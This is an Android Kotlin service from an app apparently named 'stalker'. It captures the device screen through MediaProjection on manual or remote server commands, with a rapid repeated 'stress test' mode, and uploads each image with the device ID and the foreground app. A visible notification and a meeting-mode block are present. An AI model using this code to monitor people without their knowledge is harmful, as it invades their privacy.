package com.askqing.stalker.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import android.widget.Toast
import com.askqing.stalker.StalkerApplication
import com.askqing.stalker.api.ApiClient
import com.askqing.stalker.model.ScreenshotUploadRequest
import com.askqing.stalker.util.PreferenceManager
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.util.Base64

/**
 * 截屏服务
 * 使用 MediaProjection API 捕获屏幕截图并上传到服务器
 *
 * 功能：
 * - 接收来自服务器的截图请求
 * - 使用 MediaProjection 捕获屏幕
 * - 将截图转为 Base64 并上传
 * - 支持压力测试模式（快速连续截图）
 * - 会议模式下阻止截图
 */
class ScreenshotService : Service() {

    companion object {
        private const val TAG = "ScreenshotService"
        private const val SCREENSHOT_REQUEST_CODE = 1001

        // MediaProjection 结果存储
        @Volatile
        var resultCode: Int = 0
        @Volatile
        var resultData: Intent? = null

        // 是否有有效的 MediaProjection
        val hasProjection: Boolean get() = resultData != null

        // 截图回调
        var onScreenshotResult: ((success: Boolean, message: String) -> Unit)? = null
    }

    private val preferenceManager: PreferenceManager by lazy { PreferenceManager(this) }
    private val apiClient: ApiClient by lazy { ApiClient.getInstance(this) }
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val mainHandler = Handler(Looper.getMainLooper())

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    private var screenWidth = 720
    private var screenHeight = 1280
    private var screenDensity = 2

    // 压力测试模式
    private var isStressTest = false
    private var stressTestJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        getScreenMetrics()
        startForegroundNotification()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "TAKE_SCREENSHOT" -> {
                if (preferenceManager.isMeetingMode) {
                    Toast.makeText(this, "会议模式中，无法截图", Toast.LENGTH_SHORT).show()
                    onScreenshotResult?.invoke(false, "会议模式中")
                } else {
                    takeScreenshot("manual")
                }
            }
            "REMOTE_SCREENSHOT" -> {
                if (preferenceManager.isMeetingMode) {
                    Log.w(TAG, "会议模式中，拒绝远程截图请求")
                } else {
                    val stressTest = intent.getBooleanExtra("stress_test", false)
                    val intervalMs = intent.getIntExtra("interval_ms", 1000)
                    if (stressTest) {
                        startStressTest(intervalMs)
                    } else {
                        takeScreenshot("remote")
                    }
                }
            }
            "STOP_STRESS_TEST" -> {
                stopStressTest()
            }
            "STOP_SERVICE" -> {
                stopSelf()
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        stopStressTest()
        releaseProjection()
        scope.cancel()
        Log.i(TAG, "截屏服务已销毁")
    }

    // ==================== 截屏核心 ====================

    /**
     * 获取屏幕尺寸
     */
    private fun getScreenMetrics() {
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        windowManager.defaultDisplay.getMetrics(metrics)
        screenWidth = metrics.widthPixels
        screenHeight = metrics.heightPixels
        screenDensity = metrics.densityDpi
    }

    /**
     * 获取 MediaProjection
     */
    private fun setupProjection(): Boolean {
        if (mediaProjection != null) return true

        if (resultData == null) {
            Log.w(TAG, "没有有效的 MediaProjection 权限")
            requestScreenshotPermission()
            return false
        }

        return try {
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData!!)
            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    super.onStop()
                    Log.i(TAG, "MediaProjection 已停止")
                    mediaProjection = null
                    virtualDisplay?.release()
                    virtualDisplay = null
                }
            }, mainHandler)
            Log.i(TAG, "MediaProjection 创建成功")
            true
        } catch (e: Exception) {
            Log.e(TAG, "创建 MediaProjection 失败", e)
            false
        }
    }

    /**
     * 截取屏幕
     */
    private fun takeScreenshot(trigger: String) {
        if (!setupProjection()) {
            onScreenshotResult?.invoke(false, "无法创建 MediaProjection")
            return
        }

        try {
            // 创建 ImageReader
            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)

            // 创建 VirtualDisplay
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "StalkerScreenshot",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, mainHandler
            )

            // 设置图像可用监听
            imageReader?.setOnImageAvailableListener({ reader ->
                val image: Image? = reader.acquireLatestImage()
                if (image != null) {
                    processImage(image, trigger)
                    reader.setOnImageAvailableListener(null, null)
                    reader.close()
                    virtualDisplay?.release()
                    virtualDisplay = null
                }
            }, mainHandler)

        } catch (e: Exception) {
            Log.e(TAG, "截图失败", e)
            onScreenshotResult?.invoke(false, "截图异常: ${e.message}")
        }
    }

    /**
     * 处理截取的图像
     */
    private fun processImage(image: Image, trigger: String) {
        scope.launch {
            try {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * screenWidth

                // 创建 Bitmap
                val bitmap = Bitmap.createBitmap(
                    screenWidth + rowPadding / pixelStride,
                    screenHeight,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)

                // 裁剪掉多余部分
                val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)

                // 转为 Base64
                val outputStream = ByteArrayOutputStream()
                croppedBitmap.compress(Bitmap.CompressFormat.PNG, 80, outputStream)
                val imageBytes = outputStream.toByteArray()
                val base64 = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    Base64.getEncoder().encodeToString(imageBytes)
                } else {
                    @Suppress("DEPRECATION")
                    android.util.Base64.encodeToString(imageBytes, android.util.Base64.NO_WRAP)
                }

                // 上传到服务器
                val upload = ScreenshotUploadRequest(
                    deviceId = preferenceManager.deviceId,
                    imageBase64 = base64,
                    width = screenWidth,
                    height = screenHeight,
                    currentApp = preferenceManager.lastForegroundApp,
                    trigger = trigger
                )

                val success = apiClient.uploadScreenshot(upload)

                // 释放资源
                bitmap.recycle()
                croppedBitmap.recycle()
                image.close()

                if (success) {
                    Log.i(TAG, "截图上传成功 ($trigger)")
                    onScreenshotResult?.invoke(true, "截图已上传")
                } else {
                    Log.w(TAG, "截图上传失败")
                    onScreenshotResult?.invoke(false, "上传失败")
                }
            } catch (e: Exception) {
                Log.e(TAG, "处理截图失败", e)
                image.close()
                onScreenshotResult?.invoke(false, "处理失败: ${e.message}")
            }
        }
    }

    // ==================== 压力测试 ====================

    /**
     * 开始压力测试（快速连续截图）
     */
    private fun startStressTest(intervalMs: Int) {
        if (stressTestJob?.isActive == true) return

        isStressTest = true
        var count = 0

        stressTestJob = scope.launch {
            while (isActive && isStressTest) {
                Log.d(TAG, "压力测试截图 #${++count}")
                takeScreenshot("stress_test")
                delay(intervalMs.toLong())
            }
        }

        Log.i(TAG, "压力测试开始，间隔 ${intervalMs}ms")
    }

    private fun stopStressTest() {
        isStressTest = false
        stressTestJob?.cancel()
        stressTestJob = null
        Log.i(TAG, "压力测试已停止")
    }

    // ==================== 权限请求 ====================

    /**
     * 请求截屏权限
     * 需要在外部 Activity 中处理
     */
    private fun requestScreenshotPermission() {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val intent = projectionManager.createScreenCaptureIntent()
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

        // 发送广播让 Activity 处理
        val broadcastIntent = Intent("com.askqing.stalker.REQUEST_SCREENSHOT_PERMISSION")
        sendBroadcast(broadcastIntent)

        // 直接启动
        startActivity(intent)
    }

    // ==================== 资源释放 ====================

    private fun releaseProjection() {
        virtualDisplay?.release()
        virtualDisplay = null
        imageReader?.close()
        imageReader = null
        mediaProjection?.stop()
        mediaProjection = null
    }

    // ==================== 前台通知 ====================

    private fun startForegroundNotification() {
        val notification = createNotification()
        startForeground(2, notification)
    }

    private fun createNotification(): Notification {
        val intent = packageManager.getLaunchIntentForPackage(packageName) ?: Intent()
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return Notification.Builder(this, StalkerApplication.CHANNEL_ID_SCREENSHOT)
            .setContentTitle("截图服务")
            .setContentText(if (isStressTest) "压力测试中..." else "截屏服务就绪")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .build()
    }
}
